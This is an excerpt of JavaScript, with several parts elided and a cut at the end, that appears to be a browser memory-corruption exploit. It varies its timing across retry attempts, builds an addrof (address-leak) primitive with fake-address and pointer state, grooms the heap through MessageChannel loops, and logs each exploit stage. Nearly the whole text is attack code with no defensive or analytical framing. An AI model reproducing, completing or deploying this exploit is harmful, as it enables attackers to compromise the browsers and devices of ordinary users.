...
const CAPTURE_WHEEL = [0, 13, 7, 19, 11, 23];
const COMPOSE_WHEEL = [0, 21, 11, 31, 17, 37];
const DRAIN_WHEEL = [0, 4, -3, 6, -5, 8];
...
let effCaptureDelayMs = CAPTURE_DELAY_MS;
let effComposeDelayMs = COMPOSE_DELAY_MS;
let effDrainCount = DRAIN_COUNT;
...
function resetAttemptState() {
    ...
    fakeAddress = NaN;
    predecessorWords = null;
    keepAlive = new Array(effDrainCount + 3);
    keepIndex = 0;
    pointerLow = 0;
    pointerHigh = 0;
    targetAddress = NaN;
...
function startAttempt() {
    ...
    const wheel = (attemptNumber - 1) % CAPTURE_WHEEL.length;
    effCaptureDelayMs = CAPTURE_DELAY_MS + CAPTURE_WHEEL[wheel];
    effComposeDelayMs = COMPOSE_DELAY_MS + COMPOSE_WHEEL[wheel];
    effDrainCount = Math.max(64, DRAIN_COUNT + DRAIN_WHEEL[wheel]);
    ...
    emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
        + `-capture-ms=${effCaptureDelayMs}-compose-ms=${effComposeDelayMs}`
        + `-groom-n=${effDrainCount}`);
    try {
        buildAndStoreGraph();
...
function buildAndStoreGraph() {
    ...
    emit("SSV-BUILD", `k=${K}-n=${effDrainCount}`);
...
function prepareAddrof() {
    ...
    emit("ADDROF-WRAPPER-READY", `wait=${effCaptureDelayMs}ms`);

    setTimeout(runAddrofCapture, effCaptureDelayMs);
    setTimeout(beginComposition, effComposeDelayMs);
}
...
function runGroomAndLoad() {
    try {
        emit("SSV-GROOM-ENTER", `n=${effDrainCount}`);
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < effDrainCount; ++i)
